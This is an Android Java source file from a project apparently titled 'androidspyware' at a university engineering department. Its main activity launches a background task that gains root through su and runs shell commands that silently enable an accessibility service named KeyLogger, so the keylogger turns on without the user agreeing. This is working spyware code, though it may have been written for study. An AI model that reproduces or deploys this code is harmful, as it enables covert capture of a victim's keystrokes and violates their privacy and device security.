package edu.wisc.ece.androidspyware;

import androidx.appcompat.app.AppCompatActivity;

import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Looper;

import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // run our malicous task
        (new EnableAccessibility()).execute();
    }

    /**
     * We execute our spyware on an Background thread. We should also be able to get superuser privideges from a background thread. Using su, we can allow our app to access the accessibility event.
     * https://developer.android.com/reference/android/os/AsyncTask
     * https://developer.android.com/reference/android/os/Looper
     */
    private class EnableAccessibility extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // Use looper to ensure that we are only running su on a background thread
            if (Looper.myLooper() == Looper.getMainLooper()) {
                // Main Thread
            } else {
                // Background Thread
                try {
                    Process process = Runtime.getRuntime().exec("su");
                    DataOutputStream os = new DataOutputStream(process.getOutputStream());
                    os.writeBytes("settings put secure enabled_accessibility_services edu.wisc.ece.androidspyware/edu.wisc.ece.androidspyware.KeyLogger\n");
                    os.flush();
                    os.writeBytes("settings put secure accessibility_enabled 1\n");
                    os.flush();
                    os.writeBytes("exit\n");
                    os.flush();

                    process.waitFor();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

            // at this point, we no longer need this background thread anymore
            return null;
        }
    }
}